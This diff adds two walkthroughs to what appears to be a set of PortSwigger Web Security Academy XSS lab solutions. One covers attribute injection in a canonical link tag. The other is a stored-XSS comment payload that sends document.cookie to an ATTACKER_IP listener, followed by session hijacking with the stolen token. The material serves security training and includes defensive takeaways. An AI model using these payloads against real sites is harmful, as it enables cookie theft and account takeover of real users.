@@ -524,3 +524,87 @@ Host: target.web-security-academy.net
 8. View the page in the browser. The SVG engine initializes the `<animatetransform>` element and fires the `onbegin` event immediately, executing `alert(1)`.
 
 > **Key Takeaway:** The SVG vector space contains numerous niche elements and non-standard event handlers (such as `onbegin`, `onend`, and `onrepeat`) that easily bypass WAF blocklists focused solely on traditional HTML elements (`<script>`, `<img>`, `onload`). Complete protection against reflected XSS requires robust context-aware output encoding or a strict Content Security Policy (CSP) rather than incomplete tag blacklists.
+
+---
+
+### [PS-XSS-15] Reflected XSS in canonical link tag
+
+**Scenario:** The application dynamically reflects URL path parameters or query strings into the `href` attribute of a `<link rel="canonical">` element within the page `<head>`. Although elements inside `<head>` are rendered invisibly by the browser and cannot be clicked directly, single quotes (`'`) are left unescaped. This allows an attacker to break out of the `href` attribute and inject `accesskey` and `onclick` attributes, enabling payload execution via keyboard shortcut interaction.
+
+**Solution:**
+
+1. Access the target home page and inspect the source code inside the `<head>` section to locate the canonical link element:
+
+```html
+<link rel="canonical" href="https://target.web-security-academy.net/" />
+
+```
+
+2. Append query parameters containing single quotes to test whether input reflects unescaped inside the `href` attribute:
+
+```text
+/?'accesskey='x'onclick='alert(1)
+
+```
+
+3. Submit the request containing the payload:
+
+```http
+GET /?'accesskey='x'onclick='alert(1) HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+4. Inspect the rendered HTML response to verify attribute breakout:
+
+```html
+<link rel="canonical" href="https://target.web-security-academy.net/?' accesskey='x' onclick='alert(1)' />
+
+```
+
+5. Trigger the payload by pressing the keyboard shortcut assigned to `accesskey="x"` anywhere on the page:
+* **Windows / Linux:** `Alt` + `Shift` + `X`
+* **macOS:** `Control` + `Option` + `X`
+
+
+6. The browser programmatically dispatches a click event to the canonical link element, executing the `onclick` handler and triggering `alert(1)`.
+
+> **Key Takeaway:** Dynamically constructing HTML attributes from raw request URIs without context-aware attribute encoding enables attribute injection attacks. Furthermore, invisible elements in the DOM (such as `<link>` or `<meta>` tags in `<head>`) can still serve as XSS vectors when combined with input-focused attributes like `accesskey`.
+
+---
+
+### [PS-XSS-16] Exploiting cross-site scripting to steal cookies (Non-Collaborator Solution)
+
+**Scenario:** The application contains a stored XSS vulnerability in the blog comments function. When a user posts a comment, it is rendered unsanitized to all subsequent visitors—including a simulated victim/admin user. Because the application does not set the `HttpOnly` flag on session cookies, an attacker can post a script payload that reads `document.cookie` and exfiltrates it to an attacker-controlled HTTP listener (such as a local Python server or Netcat instance on an internal exam/VPN network) to perform session hijacking.
+
+**Solution:**
+
+1. Open a terminal on your attacking machine (e.g., Kali Linux) and start a lightweight HTTP server on an accessible port:
+
+```bash
+python3 -m http.server 8080
+
+```
+
+2. Navigate to a blog post on the target application and submit a comment containing an asynchronous image-based exfiltration payload. Replace `ATTACKER_IP` with your machine's VPN/network IP:
+
+```html
+<script>
+new Image().src = 'http://ATTACKER_IP:8080/?cookie=' + encodeURIComponent(document.cookie);
+</script>
+
+```
+
+3. Submit the comment. When the victim user views the comment section, their browser executes the script, instantiates an HTTP request, and sends their session cookie to your server.
+4. Check your terminal logs for the incoming `GET` request containing the victim's session token in the query string:
+
+```text
+10.10.x.x - - [24/Aug/2026 18:47:00] "GET /?cookie=secret_session_token_12345 HTTP/1.1" 200 -
+
+```
+
+5. Intercept any request to the target site using Burp Suite (or open Browser DevTools -> Application -> Cookies).
+6. Replace your `session` cookie value with the stolen `secret_session_token_12345` token.
+7. Refresh or navigate to `/my-account` to confirm successful session hijacking under the victim's identity.
+
+> **Key Takeaway:** Stored XSS combined with accessible `document.cookie` values allows complete session hijacking. The primary defense is enforcing the `HttpOnly` attribute on all sensitive session cookies to block JavaScript DOM access, combined with strict output encoding and a Content Security Policy (CSP) restricting outbound connection destinations (`connect-src` / `img-src`).
